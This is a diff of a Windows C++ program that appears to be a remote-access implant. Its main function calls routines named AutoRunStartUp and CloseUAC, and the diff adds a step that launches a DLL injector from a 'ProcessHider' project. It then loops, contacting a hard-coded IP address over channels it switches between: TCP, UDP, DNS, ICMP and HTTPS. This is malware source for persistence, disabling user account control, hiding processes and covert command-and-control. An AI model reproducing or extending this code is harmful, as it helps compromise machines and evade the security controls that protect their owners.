@@ -139,7 +139,7 @@ int Protocol(char *ip) {
 				iResult = send(ConnectSocket, "1", 1, 0);
 				return 5;
 			}
-			else if (recvbuf[0] == '6') {				
+			else if (recvbuf[0] == '6') {
 				printf("\nProtocol ICMP \n");
 				iResult = send(ConnectSocket, "1", 1, 0);
 				return 6;
@@ -549,9 +549,9 @@ int Ping(char *ip) {
 		//_ICMP = new ICMP();
 
 		//Fill in echo reply..
-		
 
-		
+
+
 		memcpy(sendBuffer, _ICMP, sizeof(struct ICMP));
 		char msg[] = "I am ICMP!";
 		//cout << _ICMP << endl;
@@ -715,7 +715,7 @@ int HTTPS(char *ip) {
 		SSL_CTX_free(ctx);
 
 		WSACleanup();
-//		printf("Finished.\n");
+		//		printf("Finished.\n");
 		if (flag == 1) return 0;
 	}
 	return 0;
@@ -724,23 +724,16 @@ int main()
 {
 	AutoRunStartUp();
 	CloseUAC();
+	stringstream ss;
+	string path = "D:\\Nam 5\\t6\\ProcessHider-master\\ProcessHider-master\\x64\\Release\\DLL_Injector.exe";
+
+	ss << "\"";                             // command opening quote
+	ss << "\"" << path << "\" "; // Quoted binary (could have spaces)
+	ss << "\"";                             // command closing quote
+	startup(ss.str().c_str());
 	//ShowWindow(GetConsoleWindow(), SW_HIDE);
-	char ip[] = "192.168.8.100";
-	//UDP(ip);
-	//TCP(ip);
+	char ip[] = "192.168.8.102";
 
-	//WSADATA wsaData; ///The WSADATA structure contains information about the Windows Sockets implementation.
-	//SOCKET ConnectSocket = INVALID_SOCKET;
-
-	//int iResult;
-	//// Initialize Winsock
-	//iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
-	//if (iResult != 0) {
-	//	printf("WSAStartup failed with error: %d\n", iResult);
-	//	return 1;
-	//}
-
-	//DNS(ip);
 	while (1) {
 		int protocol = Protocol(ip);
 		if (protocol == 2) {
@@ -762,7 +755,7 @@ int main()
 		else if (protocol == 5) {
 			HTTPS(ip);
 		}
-		else {		
+		else {
 			Ping(ip);
 		}
 	}
